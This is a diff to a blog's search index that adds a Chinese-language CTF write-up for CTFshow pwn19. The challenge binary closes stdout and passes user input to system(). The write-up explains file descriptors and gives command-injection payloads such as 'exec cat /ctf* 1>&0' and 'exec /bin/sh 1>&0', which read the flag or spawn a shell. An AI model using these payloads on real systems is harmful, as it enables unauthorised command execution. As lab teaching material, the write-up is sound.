@@ -2698,8 +2698,6 @@ import numpy as np
       <categories>
         <category>CTF</category>
         <category>Pwn</category>
-        <category>前置基础</category>
-        <category>Pwn</category>
       </categories>
       <tags>
         <tag>Pwn</tag>
@@ -5016,6 +5014,325 @@ Ctrl+V 粘贴密码
       </categories>
       <tags>
         <tag>Pwn</tag>
+        <tag>CTFShow</tag>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[ pwn 学习 ] CTFshow-pwn19 关闭输出流</title>
+    <url>/posts/pwn19-close-stdout/</url>
+    <content><![CDATA[<h1 id="1-基础信息"><a href="#1-基础信息" class="headerlink" title="1. 基础信息"></a>1. 基础信息</h1><p>查看二进制文件安全防护</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">checksec pwn19</span><br><span class="line">  Arch:     amd64-64-little</span><br><span class="line">  RELRO:    Full RELRO</span><br><span class="line">  Stack:    Canary found</span><br><span class="line">  NX:       NX enabled</span><br><span class="line">  PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+
+<p>64 位程序，保护全开</p>
+<h1 id="2-反编译分析（main-函数）"><a href="#2-反编译分析（main-函数）" class="headerlink" title="2. 反编译分析（main 函数）"></a>2. 反编译分析（main 函数）</h1><p>拖进 IDA F5 反编译</p>
+<p>核心逻辑如下</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x30</span>];          <span class="comment">// [rbp-0x30], 实际使用 0x20=32 字节</span></span><br><span class="line">    <span class="type">pid_t</span> pid;               <span class="comment">// [rbp-0x34]</span></span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);   <span class="comment">// _IONBF = 2</span></span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);    <span class="comment">// _IONBF = 2, 但这里传了 1 (_IOLBF)?</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印 CTFshow 横幅 (共11段 puts)</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;     * *************************************                           &quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;     * Classify: CTFshow --- PWN ---                                  &quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;     * Type  : Linux_Security_Mechanisms                              &quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;     * Site  : https://ctf.show/                                      &quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;     * Hint  : Turn off output, how to get flag?                      &quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;                                                                      &quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;give you a shell! now you need to get flag!                           &quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;     * *************************************                           &quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;     * Classify: CTFshow --- PWN ---                                  &quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;     * Type  : Linux_Security_Mechanisms                              &quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;     * Site  : https://ctf.show/                                      &quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ========== 关键逻辑 ==========</span></span><br><span class="line">    pid = fork();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// ===== 子进程 =====</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;give you a shell! now you need to get flag!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// !!! 关闭 stdout，所以子进程的输出你看不到 !!!</span></span><br><span class="line">        fclose(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从 stdin 读取 32 字节</span></span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// !!! 直接将输入传给 system() — 命令注入漏洞 !!!</span></span><br><span class="line">        system(buf);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// ===== 父进程 =====</span></span><br><span class="line">        wait(<span class="literal">NULL</span>);          <span class="comment">// 等待子进程结束</span></span><br><span class="line">        sleep(<span class="number">3</span>);            <span class="comment">// 睡 3 秒</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;flag is not here!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>程序结构：</p>
+<ul>
+<li><code>fork()</code>分身：程序用<code>fork()</code>分出一个子进程</li>
+<li>父进程：只是<code>wait()</code>等子进程结束，然后睡 3 秒，打印了一句<code>flag is not here!</code></li>
+<li><strong>子进程：</strong>先<code>fclose(stdout)</code>把标准输出关了→再读 32 字节输入→直接把输入喂给<code>system()</code>执行</li>
+</ul>
+<h1 id="3-stdout被关了"><a href="#3-stdout被关了" class="headerlink" title="3.stdout被关了"></a>3.<code>stdout</code>被关了</h1><p><strong>3.1 程序做了什么</strong></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 把程序的嘴缝上</span></span><br><span class="line">fclose(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 给你32字节发言权</span></span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 你说的内容直接被当作命令执行</span></span><br><span class="line">system(buf);</span><br></pre></td></tr></table></figure>
+
+<p>即使输入<code>cat /ctfshow_flag</code>，虽然命令确实执行力，<code>cat</code>确实读到了<code>flag</code>，但是<code>stdout</code>已经被关了——数据读不出来</p>
+<h1 id="4-前置知识：文件描述符（FD）"><a href="#4-前置知识：文件描述符（FD）" class="headerlink" title="4.前置知识：文件描述符（FD）"></a>4.前置知识：文件描述符（FD）</h1><p>在 Linux 中”一切皆文件”。每个进程打开一个流，内核都分配一个数字编号给它。</p>
+<table>
+<thead>
+<tr>
+<th>编号</th>
+<th>名称</th>
+<th>作用</th>
+<th>通俗比喻</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0</td>
+<td>stdin</td>
+<td>标准输入</td>
+<td>程序的”耳朵” — 听你输入</td>
+</tr>
+<tr>
+<td><strong>1</strong></td>
+<td><strong>stdout</strong></td>
+<td><strong>标准输出</strong></td>
+<td><strong>程序的”嘴巴” — 说话给你听</strong></td>
+</tr>
+<tr>
+<td>2</td>
+<td>stderr</td>
+<td>标准错误</td>
+<td>程序的”求救声” — 报错信息</td>
+</tr>
+</tbody></table>
+<p>关键事实：在 <code>socat</code> 搭建的 socket 连接中，fd 0（stdin）和 fd 1（stdout）实际上指向同一个双向通道。虽然程序的”嘴巴”（fd 1）被封上了，但它的”耳朵”（fd 0）还在，而且这个耳朵是双向的！</p>
+<p>给了我们一定的操作空间。</p>
+<h1 id="5-思路：文件描述符重定向"><a href="#5-思路：文件描述符重定向" class="headerlink" title="5.思路：文件描述符重定向"></a>5.思路：文件描述符重定向</h1><h2 id="5-1-核心想法"><a href="#5-1-核心想法" class="headerlink" title="5.1 核心想法"></a>5.1 核心想法</h2><p>既然 fd 1（嘴巴）被封了，而 fd 0（耳朵）是双向的通道，那我们就把 fd 1 的输出<strong>重定向</strong>到 fd 0 里，强行把数据从”耳朵”里挤出去。</p>
+<p>在 shell 中，这行命令可以做到：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt;&amp;<span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<p>拆解：</p>
+<ul>
+<li><p><code>1</code>：文件描述符 1（stdout）</p>
+</li>
+<li><p><code>&gt;</code>：重定向符 </p>
+</li>
+<li><p><code>&amp;0</code>：目标为文件描述符 0（stdin）</p>
+</li>
+</ul>
+<p><strong>效果</strong>：把所有本来要写到 fd 1 的数据，强行灌进 fd 0。</p>
+<p>fd 0 是双向 socket，数据就能传回你的屏幕。</p>
+<h2 id="5-2-配合-exec-使用"><a href="#5-2-配合-exec-使用" class="headerlink" title="5.2 配合 exec 使用"></a>5.2 配合 exec 使用</h2><p>仅仅 <code>cat /ctf* 1&gt;&amp;0</code> 还不够。</p>
+<p>问题在于 <code>system()</code> 会先起一个 <code>/bin/sh -c</code> 子 shell，在子 shell 里做重定向。这个子 shell 一退出，<code>cat</code> 读到 stdout 已关的信息可能还没刷出去。</p>
+<p>所以我们用 <code>exec</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec cat /ctf* 1&gt;&amp;0</span><br></pre></td></tr></table></figure>
+
+<p><code>exec</code> 的作用：<strong>用新的进程替换当前 shell 进程本身</strong>，不创建子 shell。这样重定向在当前进程里生效，数据稳稳地写进 fd 0 再传回客户端。</p>
+<h2 id="5-3-完整-payload"><a href="#5-3-完整-payload" class="headerlink" title="5.3 完整 payload"></a>5.3 完整 payload</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec cat /ctf* 1&gt;&amp;0</span><br></pre></td></tr></table></figure>
+
+<p>逐段讲解：</p>
+<table>
+<thead>
+<tr>
+<th>部分</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>exec</code></td>
+<td>用后面的命令替换当前 shell 进程，确保重定向在当前进程中生效</td>
+</tr>
+<tr>
+<td><code>cat /ctf*</code></td>
+<td>读取 <code>/</code>目录下名字以 <code>ctf</code>开头的文件（就是 flag 文件）</td>
+</tr>
+<tr>
+<td><code>1&gt;&amp;0</code></td>
+<td>把 fd 1（stdout）重定向到 fd 0（stdin）<br/>— 用双向的”耳朵”通道把数据传回来</td>
+</tr>
+</tbody></table>
+<h1 id="6-更多可用的-payload"><a href="#6-更多可用的-payload" class="headerlink" title="6. 更多可用的 payload"></a>6. 更多可用的 payload</h1><table>
+<thead>
+<tr>
+<th>Payload</th>
+<th>长度</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>exec cat /ctf* 1&gt;&amp;0</code></td>
+<td>21 字节</td>
+<td>标准解法，直接读 flag</td>
+</tr>
+<tr>
+<td><code>exec /bin/sh 1&gt;&amp;0</code></td>
+<td>18 字节</td>
+<td>弹一个交互式 shell，拿到后想干啥干啥</td>
+</tr>
+<tr>
+<td><code>exec /bin/sh 0&gt;&amp;1</code></td>
+<td>18 字节</td>
+<td>反过来把 stdin 绑到 stdout，同样能弹 shell</td>
+</tr>
+<tr>
+<td><code>exec cat /f* 1&gt;&amp;0</code></td>
+<td>18 字节</td>
+<td>用 <code>f*</code>匹配 <code>/flag</code>更短</td>
+</tr>
+<tr>
+<td><code>exec cat /*ag* 1&gt;&amp;0</code></td>
+<td>21 字节</td>
+<td>模糊匹配 flag 路径</td>
+</tr>
+<tr>
+<td><code>exec ls / 1&gt;&amp;0</code></td>
+<td>16 字节</td>
+<td>先看看根目录下都有啥，探路用</td>
+</tr>
+<tr>
+<td><code>exec sh 1&gt;&amp;0</code></td>
+<td>14 字节</td>
+<td>最短的弹 shell 方式（比 <code>/bin/sh</code>短 4 字节）</td>
+</tr>
+</tbody></table>
+<h1 id="7-其他重定向操作"><a href="#7-其他重定向操作" class="headerlink" title="7. 其他重定向操作*"></a>7. 其他重定向操作*</h1><table>
+<thead>
+<tr>
+<th>Payload</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>**exec cat /ctf* &gt;&amp;0**</code></td>
+<td><code>**&gt;&amp;0**</code>**是 **<code>**1&gt;&amp;0**</code><strong>的简写，效果一样（省 1 字节）</strong></td>
+</tr>
+<tr>
+<td><code>exec cat /ctf* 2&gt;&amp;1</code></td>
+<td>shell 执行顺序是从右往左<br/>先 ①<code>2&gt;&amp;1</code>是把 fd2 重定向到 fd1 指向空的地方 那 fd2 也指向空了<br/>后 ②<code>exec cat /ctf*</code>cat 读取文件内容，试图写入 fd1，fd 又已经关了，数据丢失。如果 cat 报错写入 fd2。fd2 已经被重定向到 fd1 那么报错也丢了。<br/>雪上加霜。</td>
+</tr>
+<tr>
+<td><code>exec cat /ctf* 2&gt;&amp;0</code></td>
+<td>把 stderr 也重定向到 fd 0</td>
+</tr>
+<tr>
+<td><code>**exec cat /ctf*&gt;&amp;0**</code></td>
+<td><strong>极简写法，不带空格也能在 shell 中解析</strong></td>
+</tr>
+</tbody></table>
+<h1 id="8-此类漏洞思路总结"><a href="#8-此类漏洞思路总结" class="headerlink" title="8. 此类漏洞思路总结"></a>8. 此类漏洞思路总结</h1><h2 id="8-1-遇到”没输出”的情况怎么排查"><a href="#8-1-遇到”没输出”的情况怎么排查" class="headerlink" title="8.1 遇到”没输出”的情况怎么排查"></a>8.1 遇到”没输出”的情况怎么排查</h2><table>
+<thead>
+<tr>
+<th>现象</th>
+<th>可能原因</th>
+<th>应对思路</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>命令输入后没回显</td>
+<td>stdout 被关了</td>
+<td>尝试 <code>1&gt;&amp;0</code>或 <code>1&gt;&amp;2</code>重定向</td>
+</tr>
+<tr>
+<td>有错误提示但没正常输出</td>
+<td>只关了 stdout，stderr 还在</td>
+<td>用 <code>2&gt;&amp;1</code>合并，或直接用 <code>1&gt;&amp;2</code></td>
+</tr>
+<tr>
+<td>完全没反应</td>
+<td>可能进程卡住或退出了</td>
+<td>检查 <code>system()</code>是否真的执行了</td>
+</tr>
+<tr>
+<td>有输出但不完整</td>
+<td>缓冲区没刷新</td>
+<td>加 <code>exec</code>替换进程，或在命令后加 <code>;exit</code></td>
+</tr>
+</tbody></table>
+<h2 id="8-2-搜索危险函数"><a href="#8-2-搜索危险函数" class="headerlink" title="8.2 搜索危险函数"></a>8.2 搜索危险函数</h2><table>
+<thead>
+<tr>
+<th>函数</th>
+<th>为什么危险</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>system()</code></td>
+<td>参数可控 &#x3D; 命令注入（本题）</td>
+</tr>
+<tr>
+<td><code>popen()</code></td>
+<td>同上，打开管道执行命令</td>
+</tr>
+<tr>
+<td><code>execve()</code>家族</td>
+<td>参数可控 &#x3D; 任意命令执行</td>
+</tr>
+<tr>
+<td><code>fclose(stdout)</code> &#x2F; <code>close(1)</code></td>
+<td>关闭输出流，可能是考点信号</td>
+</tr>
+</tbody></table>
+<h2 id="8-3-文件描述符考点"><a href="#8-3-文件描述符考点" class="headerlink" title="8.3 文件描述符考点"></a>8.3 文件描述符考点</h2><table>
+<thead>
+<tr>
+<th>操作</th>
+<th>效果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>**fclose(stdout)**</code></td>
+<td><strong>关闭 fd 1，程序失去输出能力</strong></td>
+</tr>
+<tr>
+<td><code>**close(1)**</code></td>
+<td>**同 **<code>**fclose(stdout)**</code><strong>，关闭标准输出</strong></td>
+</tr>
+<tr>
+<td><code>dup2(a, b)</code></td>
+<td>把 fd a 复制到 fd b</td>
+</tr>
+<tr>
+<td><code>1&gt;&amp;0</code></td>
+<td>把 stdout 重定向到 stdin</td>
+</tr>
+<tr>
+<td><code>1&gt;&amp;2</code></td>
+<td>把 stdout 重定向到 stderr</td>
+</tr>
+<tr>
+<td><code>0&gt;&amp;1</code></td>
+<td>把 stdin 重定向到 stdout</td>
+</tr>
+</tbody></table>
+<h2 id="8-4-为什么-1-0-能行"><a href="#8-4-为什么-1-0-能行" class="headerlink" title="8.4 为什么 1&gt;&amp;0 能行"></a>8.4 为什么 <code>1&gt;&amp;0</code> 能行</h2><p>在 <code>socat TCP-LISTEN:...,fork EXEC:./pwn</code> 的场景中：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">客户端（你的 nc） ←——TCP——→ socat ←——fd 0=fd 1——→ ./pwn</span><br><span class="line">                                        ↑</span><br><span class="line">                                  这个通道是双向的</span><br><span class="line">                                  关了 1 没关系，0 还在</span><br><span class="line">                                  把输出塞进 0，数据照样回传</span><br></pre></td></tr></table></figure>
+
+<p><code>socat</code> 把 TCP socket 同时绑给了子进程的 stdin 和 stdout（实际上是通过 <code>dup2</code> 复制），所以 fd 0 和 fd 1 是<strong>同一个 socket 的两个副本</strong>，关了 1 不影响 0，而 0 本身既能读也能写。</p>
+<h2 id="10-shell-重定向速查表"><a href="#10-shell-重定向速查表" class="headerlink" title="10. shell 重定向速查表"></a>10. shell 重定向速查表</h2><table>
+<thead>
+<tr>
+<th>符号</th>
+<th>作用</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&gt;</code></td>
+<td>覆盖写入文件</td>
+<td><code>echo a &gt; flag</code></td>
+</tr>
+<tr>
+<td><code>&gt;&gt;</code></td>
+<td>追加写入文件</td>
+<td><code>echo a &gt;&gt; flag</code></td>
+</tr>
+<tr>
+<td><code>&lt;</code></td>
+<td>从文件读取输入</td>
+<td><code>./pwn &lt; input.txt</code></td>
+</tr>
+<tr>
+<td><code>1&gt;&amp;0</code></td>
+<td>stdout 重定向到 stdin</td>
+<td>本题核心 payload</td>
+</tr>
+<tr>
+<td><code>2&gt;&amp;1</code></td>
+<td>stderr 合并到 stdout</td>
+<td><code>./pwn 2&gt;&amp;1</code></td>
+</tr>
+<tr>
+<td><code>2&gt;&amp;0</code></td>
+<td>stderr 重定向到 stdin</td>
+<td>连报错也从”耳朵”传回来</td>
+</tr>
+<tr>
+<td><code>&amp;&gt;</code></td>
+<td>stdout + stderr 都重定向</td>
+<td><code>./pwn &amp;&gt; all.log</code></td>
+</tr>
+<tr>
+<td><code>/dev/null</code></td>
+<td>黑洞，数据丢进去就消失</td>
+<td><code>./pwn &gt; /dev/null</code></td>
+</tr>
+<tr>
+<td><code>exec</code></td>
+<td>替换当前进程执行命令</td>
+<td><code>exec cat flag 1&gt;&amp;0</code></td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>Pwn</category>
+      </categories>
+      <tags>
+        <tag>Pwn</tag>
+        <tag>Writeup</tag>
         <tag>CTFShow</tag>
         <tag>CTF</tag>
       </tags>
